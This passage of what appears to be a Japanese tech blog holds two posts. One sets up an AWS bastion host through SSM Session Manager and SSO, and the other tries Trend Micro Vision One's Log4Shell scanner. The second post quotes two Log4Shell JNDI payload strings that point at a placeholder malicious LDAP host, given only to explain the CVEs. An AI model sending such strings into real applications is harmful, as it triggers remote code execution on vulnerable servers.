\n\nというわけで、Session ManagerとSSOでアクセス管理の効率化を狙います。  > 踏み台サーバーの設定踏み台サーバーの設定 \n\nまず、データフローとしては下記の図の通りで、今回はプライベートサブネット上にEC2を置いて素のSession ManagerでDBへの接続することにします。当該インスタンスは AmazonSSMManagedInstanceCore ポリシー1を含んだロールを適用。なお、ECS ExecではSession Managerでポートフォワーディングを実現でき無かったことに加え、既存の踏み台資産を流用するため今回の実装対象から外しました。 \n\n  > SSOの設定SSOの設定 \n\n踏み台サーバーの設定が終わったら、次に当該インスタンスへ接続するためにSSOで渡すロールをアクセス権限セットに設定します。下記カスタムポリシーはEC2インスタンスにアクセスするための必要最低限のものになります。 カスタムポリシー json\n\n{ \"Version\": \"2012-10-17\", \"Statement\": [ { \"Effect\": \"Allow\", \"Action\": [ \"cloudwatch:PutMetricData\", \"ds:CreateComputer\", \"ds:DescribeDirectories\", \"ec2:DescribeInstanceStatus\", \"logs:*\", \"ssm:*\", \"ec2messages:*\" ], \"Resource\": \"*\" }, { \"Effect\": \"Allow\", \"Action\": [ \"ssm:StartSession\" ], \"Resource\": [ \"arn:aws:ssm:*:*:session/<EC2インスタンスID>\", \"arn:aws:ec2:*:*:instance/<EC2インスタンスID>\" ] }, { \"Effect\": \"Deny\", \"Action\": [ \"ssm:Describe*\", \"ssm:Get*\", \"ssm:List*\", \"logs:Describe*\", \"logs:Get*\", \"logs:List*\" ], \"Resource\": \"*\" }, { \"Effect\": \"Allow\", \"Action\": \"iam:CreateServiceLinkedRole\", \"Resource\": \"arn:aws:iam::*:role/aws-service-role/ssm.amazonaws.com/AWSServiceRoleForAmazonSSM*\", \"Condition\": { \"StringLike\": { \"iam:AWSServiceName\": \"ssm.amazonaws.com\" } } }, { \"Effect\": \"Allow\", \"Action\": \"iam:CreateServiceLinkedRole\", \"Resource\": \"arn:aws:iam::*:role/aws-service-role/ssm.amazonaws.com/AWSServiceRoleForAmazonSSM*\", \"Condition\": { \"StringLike\": { \"iam:AWSServiceName\": \"ssm.amazonaws.com\" } } }, { \"Effect\": \"Allow\", \"Action\": [ \"iam:DeleteServiceLinkedRole\", \"iam:GetServiceLinkedRoleDeletionStatus\" ], \"Resource\": \"arn:aws:iam::*:role/aws-service-role/ssm.amazonaws.com/AWSServiceRoleForAmazonSSM*\" }, { \"Effect\": \"Allow\", \"Action\": [ \"ssmmessages:CreateControlChannel\", \"ssmmessages:CreateDataChannel\", \"ssmmessages:OpenControlChannel\", \"ssmmessages:OpenDataChannel\" ], \"Resource\": \"*\" } ] }    > セッションを張るための事前準備セッションを張るための事前準備 \n\nセッションを張るためには下記3つの手順が必要になります。SSO経由のセッション設定が2通りありますが、クレデンシャル方式はセッションが切れる毎に変更する手間があるため、CLI方式をお薦めします。 \n\n1. AWS CLI v2をインストール\n2. 下記いずれかの方式でSSO経由のセッション設定を行う クレデンシャル方式 CLI（ aws sso login ）方式 \n3. クレデンシャル方式\n4. CLI（ aws sso login ）方式\n5. Session Manager プラグインをインストール  > DBクライアントの設定DBクライアントの設定 \n\n最後に、DBクライアントについて3つの手順を踏んで接続を試みます2。なお、ローカル環境でポートフォワーディングを都度行うのを省略したい方は、DataGripを利用すると良いでしょう。 \n\n1. ローカル環境にて ~/.ssh/config ファイルを編集 Session Managerにproxyと対象RDSのエンドポイントを記載 configHost <任意のhost名> HostName <※ 指定しなければlocalhostになる> User ec2-user ProxyCommand sh -c \"aws ssm start-session --target <接続する踏み台のインスタンスID> --document-name AWS-StartSSHSession --parameters 'portNumber=%p' --region ap-northeast-1 --profile <プロフィール>\" LocalForward <任意のポート> <RDSエンドポイント>:<RDSポート> IdentityFile ~/.ssh/<EC2に接続する秘密鍵> 設定したhost名でセッションマネージャー越しにssh接続できるかを確認 sh$ ssh <設定したhost名> \n2. Session Managerにproxyと対象RDSのエンドポイントを記載 configHost <任意のhost名> HostName <※ 指定しなければlocalhostになる> User ec2-user ProxyCommand sh -c \"aws ssm start-session --target <接続する踏み台のインスタンスID> --document-name AWS-StartSSHSession --parameters 'portNumber=%p' --region ap-northeast-1 --profile <プロフィール>\" LocalForward <任意のポート> <RDSエンドポイント>:<RDSポート> IdentityFile ~/.ssh/<EC2に接続する秘密鍵> \n3. 設定したhost名でセッションマネージャー越しにssh接続できるかを確認 sh$ ssh <設定したhost名> \n4. 手順1で設定したsshで接続することでポートフォワーディング\n5. DBクライアントで下記のように接続情報を設定し接続する Host: <手順1のconfigファイルにて任意指定したホスト名> Port: <手順4のconfigファイルにて任意指定したポート> 他項目: DB接続情報 \n6. Host: <手順1のconfigファイルにて任意指定したホスト名>\n7. Port: <手順4のconfigファイルにて任意指定したポート>\n8. 他項目: DB接続情報  > WRAPUPWRAPUP \n\nパブリックサブネット上の踏み台に慣れている方は馴染みのない方法に戸惑うかも知れませんが、踏み台資産を流用できるという意味で導入のコストもそれほどかかりませんし、ユーザーとしても利用の敷居は高くありませんでした。後々の管理コストを心配している方は一度検討してみてはいかがでしょうか。  \n\n1. AmazonEC2RoleforSSM は非推奨のため適用しないように注意します。 ↩ \n2. 今回はメンテナンスコストを避けるためSSH over SSMの関連ツール ssh-ssm.sh ssm-tool は使わない方針でいます。 ↩"},"name":"[2021-11-21]踏み台をSSM Session ManagerとAWS SSOで実現する","tags":["session-manager","aws-sso"],"childPublishedDate":{"published_on":"2021-11-21T00:00:00.000Z","published_on_unix":1637452800}}},{"node":{"number":127,"relative_category":"blog/soc","fields":{"title":"Trend Micro Vision Oneを試してみる","excerpt":"11月末から続いているLog4jの脆弱性について各セキュリティスコアが高レベルで指定されており、これを気にZTAの文脈でセキュリティ製品を見ていこうと思います。今回はちょうど無償提供されているTrend Micro Vision Oneを軽く触ってみようと思います。   > PROBLEMPROBLEM \n\n- 11月末から続いているLog4jの脆弱性について各セキュリティスコアが高レベルで指定されている JNDIクエリ「${jndi:ldap://malicious-server.host/aaa}」により不正なJavaクラスが実行されるケースがある（CVE-2021-44228） JNDIクエリ「${jndi:ldap://127.0.0.1#malicious-server.host/aaa}」により不正なJavaクラスが実行されるケースがある（CVE-2021-45046） \n- JNDIクエリ「${jndi:ldap://malicious-server.host/aaa}」により不正なJavaクラスが実行されるケースがある（CVE-2021-44228）\n- JNDIクエリ「${jndi:ldap://127.0.0.1#malicious-server.host/aaa}」により不正なJavaクラスが実行されるケースがある（CVE-2021-45046）  > SOLUTIONSOLUTION  \n\nFrom: Trend Micro\n Subject: Log4Shell診断ツール ご提供開始 \n\nApache Log4j2ログ出力ライブラリの複数のバージョンに影響を与える深刻な脆弱性情報が公開されています。当診断ツールは、Log4Shellの影響を受ける可能性のあるエンドポイントとWebアプリケーションを特定することができます。また、攻撃対象領域の詳細を即座に可視化し、リスクを軽減するための措置をご案内いたします。  \n\nと言うわけで、Trend Micro Vision Oneの一部機能が無償で提供されていたので確認します。Vision OneはSIEM、SOAR、EDR関連のツール。エンドポイント、サーバ、クラウド、メールおよびネットワーク全体を保護する各セキュリティ製品がセンサーとなり、各々のレイヤ―で検知した脅威や侵入の痕跡を、Threat Intelligenceを活用してサイバー攻撃の全体像を可視化します。  > Log4jShell診断ツールを試してみるLog4jShell診断ツールを試してみる \n\n1. Trend Micro Vision Oneにログイン\n2. [Log4Shell診断ツール]画面にてWindows/Mac/Linuxいずれかの診断ツールをダウンロード\n3. 1分ほどで端末にインストールされ、詳細が確認できる\n4. 自宅の端末で確認した結果はこちら \n5.  \n\nざっと試したところ数分程度でLog4Shellの診断を行う事ができました。Intune等EMMでの展開もそれほど難しくないように思います。  > 他の機能を確認他の機能を確認 \n\n先ほど試したLog4Shell診断ツールはTrend Micro Vision OneのAssessmentカテゴリのいち機能になります。Vision OneはSecurity Postureによる方針策定、Assessment・Thread Intelligenceによる脅威検出、XDR（EDR）による脅威応答、Zero Trust Secure Access・Mobile Securityによる脅威防御、Inventory Managementによる脅威特定から構成されています。  > Security PostureSecurity Posture \n\n各種リスク、脅威を表示することで、セキュリティに関する心構えとともに方針策定のヒントを提示します。    function description     Security Dashboard Company Risk Index、エンドポイントレポート、MITRE ATT&CK MATRIXマップ   Zero Trust Risk Insights アカウント侵害、脆弱性の検出、異常検出、クラウドアプリのアクティビティ、XDR検出、脅威検出     > AssessmentAssessment \n\n各種端末に対して脅威検出等のセキュリティ評価を行います。    function description     Targeted Attack Detection 標的型攻撃の検出   Security Assessment セキュリティ評価、Log4jの脆弱性検出     > Threat IntelligenceThreat Intelligence \n\n内部および外部ソースを元に分析を行い環境内の潜在的な脅威を特定します。    function description     Intelligence Reports 内部および外部のソースからの最新のインテリジェンスレポートを統合して、環境内の潜在的な脅威を特定   Suspicous Object Management 特定の疑わしいオブジェクトを検出した後に実行する接続製品のアクションを指定できます   Sandbox Analysis -     > XDR（EDR）XDR（EDR） \n\n検出モデルと応答サービスを管理します。    function description     Detection Model Management 検出モデルの管理   Workbench -   Observed Attack Techniques 観察された攻撃手法   Managed XDR マネージドXDRは検出および応答の代行サービス     > Zero Trust Secure AccessZero Trust Secure Access \n\n各種アクセス制御を管理します。    function description     Secure Access Overview -   Secure Access Rules IAM、ログイン制御   Access Control History -   Private Access Configuration プライベートアクセス制御   Internet Access Configuration インターネットアクセス制御     > Response ManagementResponse Management \n\n応答サービスを管理するものだと思いますが、XDR（EDR）との区別がよく分かりません。    function description     Response Management      > Mobile SecurityMobile Security \n\nモバイル端末に特化したセキュリティ機能、検出ログや管理ポリシーを扱います。EMM連携も可能です。    function description     Mobile Detection Logs モバイル端末検出ログ   Mobile Policy モバイル端末管理ポリシー   Risky Mobile Apps MDMとの統合機能     > Inventory ManagementInventory Management \n\n各種リソースの一覧表になります。    function description     Endpoint Inventory エンドポイント端末一覧表   Email Account Inventory Eメールアカウント一覧表   Network Inventory ネットワーク一覧表   Service Gateway Inventory サービスゲートウェイ一覧表   Mobile Inventory モバイル端末一覧表     > WRAPUPWRAPUP \n\nTrend Micro Vision Oneについて、各機能の使い勝手は分かりませんが、EDRを軸にセキュリティ機能を固めているようです。EDRについては完全自動化というのは無理でしょうから、どのくらいサポートがあるかで製品の価値がかわってくるものと思います。Log4Shell診断ツールの使い勝手は分かりましたが、コンソール画面上の他の機能を見る限りどの程度便利かはよく分かりませんでした。"},"name":"[2022-01-01]Trend Micro Vision Oneを試してみる","tags":["security","trend-micro-vision-one"],"childPublishedDate":{"published_on":"2022-01-01T00:00:00.000Z","published_on_unix":1640995200}}}]}},"pageContext":{"number":91}},"staticQueryHashes":[]}